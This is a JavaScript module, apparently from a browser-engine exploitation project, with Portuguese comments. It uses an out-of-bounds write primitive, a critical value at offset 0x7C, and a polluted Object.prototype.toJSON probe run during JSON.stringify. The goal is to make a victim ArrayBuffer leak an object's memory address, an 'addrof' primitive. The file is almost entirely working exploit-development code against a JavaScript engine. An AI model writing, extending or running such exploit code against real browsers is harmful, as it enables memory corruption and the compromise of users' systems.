// js/script3/testArrayBufferVictimCrash.mjs (V8 - Correção de Manipulação de Detalhes da Sonda)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V8_ProbeFix";

const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

// ÚNICA instância do objeto de detalhes, modificada pela sonda.
let toJSON_call_details_v28 = {};
let object_to_leak_for_addrof_attempt = null;
let victim_ab_ref_for_original_test = null;
let float64_view_ref_for_probe_check = null;

// Contador para rastrear invocações da sonda
let probeInvocationCounter = 0;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (Base Original) e Correção de Detalhes da Sonda ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    // Resetar o objeto de detalhes da sonda para este teste
    probeInvocationCounter = 0;
    toJSON_call_details_v28 = { // Inicializa/reseta o objeto global
        probe_variant: "V8_ProbeFix",
        invocations: [], // Array para armazenar detalhes de cada invocação
        final_type_observed_on_victim: "N/A",
        victim_write_attempted: false,
        victim_write_successful_assumption: false // Se a escrita no victim_ab foi feita e o tipo era [object Object]
    };

    victim_ab_ref_for_original_test = null;
    float64_view_ref_for_probe_check = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V8_ProbeFix" };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    const fill_pattern_v8 = 0.123456789101112;

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu / não teve efeito."
    };

    const corruptionTargetOffsetInOOBAB = 0x7C;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("OOB Init falhou ou buffer não está pronto.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100);

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        float64_view_ref_for_probe_check = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_ref_for_probe_check.fill(fill_pattern_v8);
        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_ref_for_probe_check[0]}.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: function ProbeCoreExploit_V8_toJSON() { // 'this' é o objeto sendo stringificado
                    probeInvocationCounter++;
                    const invocationId = probeInvocationCounter;
                    let invocation_details = {
                        id: invocationId,
                        is_victim_ab: (this === victim_ab_ref_for_original_test),
                        this_type_initial: Object.prototype.toString.call(this),
                        attempted_write_on_this: false,
                        this_type_after_write: "N/A",
                        error_during_write: null
                    };
                    // Adiciona ao array de invocações no objeto global
                    toJSON_call_details_v28.invocations.push(invocation_details);

                    logS3(`[Probe_V8 Inv#${invocationId}] Entrou. 'this' é vítima: ${invocation_details.is_victim_ab}. Tipo inicial: ${invocation_details.this_type_initial}`, "leak");

                    if (invocation_details.is_victim_ab && object_to_leak_for_addrof_attempt) {
                        logS3(`[Probe_V8 Inv#${invocationId}] Tentando escrita de addrof em this[0] (victim_ab)...`, "warn");
                        try {
                            this[0] = object_to_leak_for_addrof_attempt;
                            invocation_details.attempted_write_on_this = true;
                            toJSON_call_details_v28.victim_write_attempted = true; // Marcar que a escrita no victim foi tentada
                            logS3(`[Probe_V8 Inv#${invocationId}] Escrita em victim_ab (supostamente) realizada.`, "info");
                        } catch (e_write) {
                            invocation_details.error_during_write = `WriteAttemptError: ${e_write.name}: ${e_write.message}`;
                            logS3(`[Probe_V8 Inv#${invocationId}] ERRO durante tentativa de escrita em victim_ab[0]: ${e_write.message}`, "error");
                        }
                        invocation_details.this_type_after_write = Object.prototype.toString.call(this);
                        toJSON_call_details_v28.final_type_observed_on_victim = invocation_details.this_type_after_write;
                        logS3(`[Probe_V8 Inv#${invocationId}] Tipo de victim_ab APÓS tentativa de escrita: ${invocation_details.this_type_after_write}`, "leak");

                        if (invocation_details.attempted_write_on_this && invocation_details.this_type_after_write === '[object Object]') {
                            toJSON_call_details_v28.victim_write_successful_assumption = true;
                            logS3(`[Probe_V8 Inv#${invocationId}] victim_ab é [object Object] após escrita. Bom sinal!`, "vuln");
                        }
                    }
                    return { probe_V8_invoked: true, inv_id: invocationId, is_victim: invocation_details.is_victim_ab };
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com sonda V8.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test);

            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Retorno (da última sonda chamada?): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            // Logar o objeto global toJSON_call_details_v28 que foi modificado pela sonda
            logS3(`  Detalhes FINAIS da sonda (toJSON_call_details_v28 APÓS stringify): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v28.victim_write_attempted) {
                logS3("PASSO 3: Verificando float64_view_ref_for_probe_check[0] APÓS JSON.stringify...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_ref_for_probe_check[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido de float64_view_ref_for_probe_check[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const double_buffer_for_conversion = new ArrayBuffer(8);
                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                double_view_for_conversion[0] = value_read_as_double;
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v8) > 1e-9 &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "Escrita no victim_ab tentada E VALOR DO BUFFER MUDOU sugerindo ponteiro.";
                    if(toJSON_call_details_v28.victim_write_successful_assumption) addrof_result.message += " Sonda observou [object Object] no victim_ab pós-escrita.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Escrita no victim_ab tentada, mas valor lido do buffer não mudou ou não parece ponteiro.";
                    if (Math.abs(value_read_as_double - fill_pattern_v8) < 1e-9) addrof_result.message += " (Buffer não alterado do padrão)";
                    addrof_result.message += ` Tipo final obs no victim_ab: ${toJSON_call_details_v28.final_type_observed_on_victim}.`;
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: AddrWrite OK, AddrVal FAIL`;
                }
            } else {
                addrof_result.message = "Escrita no victim_ab não foi marcada como tentada pela sonda.";
                const last_inv = toJSON_call_details_v28.invocations.slice(-1)[0];
                if(last_inv && last_inv.error_during_write) addrof_result.message += ` Erro na última sonda: ${last_inv.error_during_write}`;
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: VictimWrite SKIPPED`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64 && addrof_result.success){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
        float64_view_ref_for_probe_check = null;
    }
    return { // Retorna o objeto global que foi modificado pela sonda
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput,
        toJSON_details: toJSON_call_details_v28, // Este é o objeto global
        addrof_attempt_result: addrof_result
    };
}
